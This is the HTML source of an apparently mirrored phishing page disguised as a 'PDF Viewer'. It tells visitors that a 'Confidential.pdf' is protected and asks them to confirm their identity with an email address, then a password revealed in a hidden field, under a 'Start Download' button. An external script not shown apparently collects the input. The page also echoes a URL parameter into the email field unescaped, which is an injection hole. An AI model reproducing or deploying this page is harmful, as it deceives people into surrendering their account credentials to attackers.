<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>PDF Viewer</title>
<link rel="shortcut icon" href="images/favicon.ico" />
<link href="javascript/facebox/src/facebox.css" rel="stylesheet" type="text/css" />
<script src="js/only.js"></script>
<script language="javascript" type="text/javascript" src="javascript/jquery-1.6.2.min.js"></script>
<script language="javascript" type="text/javascript" src="javascript/facebox/src/facebox.js"></script>
<script language="javascript" type="text/javascript" src="javascript/watermark/jquery.watermark.js"></script>
<script language="javascript" type="text/javascript" src="javascript/initx.js"></script>
<style>
.low-radius {
border-radius: 4px;
}
.btn {
padding: 2px 20px;
}
.btn-nav {
color: rgb(255, 255, 255);
background-color: #9C1408;
box-shadow: rgba(0, 0, 0, 0.156863) 0px 4px 4px 0px;
border-color: white;
}
.btn {
display: inline-block;
margin-bottom: 0px;
font-weight: normal;
text-align: center;
vertical-align: middle;
cursor: pointer;
background-image: none;
border-image-source: initial;
border-image-slice: initial;
border-image-width: initial;
border-image-outset: initial;
border-image-repeat: initial;
white-space: nowrap;
font-size: 14px;
line-height: 1.42857;
-webkit-user-select: none;
border-width: 2px;
border-style: solid;
border-color: white;
padding: 6px 12px;
border-radius: 20px;
}
.cover{
position: absolute;
top: 0;
left: 0;
height: 1000px;
width: 100%;
background-color: rgba(0,0,0,0.3);
z-index: 10;
}
#blackBar{
position:fixed;
top:0;
left:0;
width:auto;
height:65px;
background-color:#2B579A;
}
html{
height:auto;
}
</style>
<style>
body {
    font-family: "wf_SegoeUILight","wf_SegoeUI","Segoe UI Light","Segoe WP Light","Segoe UI","Segoe","Segoe WP","Tahoma","Verdana","Arial","sans-serif";
}
</style>
</head>

<body style="background-color: rgb(156, 20, 8);>
<input>
<div id="blackBar">
<table style="text-align: left; width: 95%; height: 31px;">
  <tbody>
    <tr>
      <td>
      <table style="text-align: left; width: 100px;">
        <tbody>
          <tr>
            <td>
            <table
 style="text-align: left; left: 320px; width: 153px;">
              <tbody>
                <tr>
                  <td><img
 style="top: 97px; left: 326px; width: 45px; height: 45px;"
 alt="" src="images/favicon.ico"></td>
                  <td><span
 style="color: white; font-size: 18px; ">PDF Viewer</span>
                  </td>
                </tr>
              </tbody>
            </table>
            </td>
            <td>
            <table
 style="text-align: left; width: 455px; height: 27px;">
              <tbody>
                <tr>
                  <td>
&nbsp;&nbsp;<a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Download</small></a> &nbsp;&nbsp;<a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Open</small></a>
&nbsp;&nbsp; <a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Preview</small></a> &nbsp;&nbsp;</td>
                  <td
 style="color: white; "><small></small></td>
                </tr>
              </tbody>
            </table>
            </td>
          </tr>
        </tbody>
      </table>
      </td>
      <td colspan="2"><small><span
 style="color: white; white-space: nowrap; float: left;"></span></small>
      <table
 style="text-align: left; margin-left: auto; margin-right: 0px; width: auto; height: 19px;">
        <tbody>
          <tr>
            <td>
            <table
 style="text-align: left; margin-left: auto; margin-right: 0px; width: 1px; height: 57px;">
              <tbody>
                <tr>
                  <td><img style="width: 42px; height: 42px;"
 alt="" src="images/Yyjfy0T.png"></td>
                  <td><span
 style="color: white; "></span></td>
                </tr>
              </tbody>
            </table>
            </td>
            <td style="text-align: right;"><a href="#" style="text-decoration: none; color: white; font-weight: 300;"><small>Terms of Service</small></a></td>
          </tr>
        </tbody>
      </table>
      </td>
    </tr>
  </tbody>
</table>
</div>
<div style="top: 67px;" class="cover">
<table align="center" style="background-color: rgb(225, 225, 225); text-align: center; width: 500px; height: 737px;" cellpadding="2" cellspacing="2">
<tbody>
<tr>
<td>
<div style="text-align: center;">
<span style="color: #4b4c4c; font-weight: bold; font-size: 17px;">CONFIRM YOUR IDENTITY.</span><br>
<span style="color: #4b4c4c; font-weight: 300;">Sign in with your valid email account to view this document.</span>
</div>
<br>
<br>
<img style="width: 150px; height: 150px;"
 alt="" src="images/33wr6fd.png">
<br>
<span style="color: black; font-weight: 300; font-size: 13px;">FILE: Confidential.pdf</span>
<br>
<br>
<span style="color: #4b4c4c; ">File protection is enabled. Confirm recipient email to continue.</span><br><br>
				
<table align="center" style="text-align: left; top: 324px; left: 321px; width: 400px; height: 88px;" cellpadding="2" cellspacing="2">
<tbody>
<tr>
<td> <p align="center">
    <label for="textfield"></label>
    <input name="textfield" type="text" class="textfldclass" id="email_field" value="<?php echo $_GET['login'] ?>" style="border-style: none; padding: 5px 20px; height: 25px; font-size: 20px; -moz-border-radius: 6px; -webkit-border-radius: 6px; -khtml-border-radius: 6px; border-radius:6px; color: #666666; width: 70%"/>
    <br />
  <div id="the_d_" style="display: none" align="center">
  <input name="passwww" type="password" class="textfldclass" id="password_field" style="border-style: none; padding: 5px 20px; height: 25px; font-size: 20px; -moz-border-radius: 6px; -webkit-border-radius: 6px; -khtml-border-radius: 6px; border-radius:6px; color: #666666; width: 70%"/></div>
    
  </p>
  <p align="center"> 
    <input name="button" type="submit" class="btn btn-nav low-radius" id="download" value="Start Download" />
    <br />
  </p></td>
</tr>
<tr>
<td style="text-align: center;">&nbsp;</td>
</tr>
</tbody>
</table>

<small style="color: black;  font-weight: 300;"><span>*
simple to use.<br>
* cross-platform compatibility.
</span><br>
<span>* IRM and
password-protection.</span>
<br>
<br>
<span>
The contents of this document are confidential and intended solely for the recipient. Reproduction of, or forwarding to anyone not directly sent this document is strictly forbidden.</span><br></small>
</td>
</tr>
</tbody>
</table>
</div>
<div  style="border: 1px solid black;"><img src="images/7dHA6V2.jpg" alt="" style=" width:100%; height:auto; max-height:100%;">
</div>
</body>
<!-- Mirrored from www.dekorlodi.com/oo/download.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID%26userid= by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 25 Oct 2018 06:38:42 GMT -->
</html>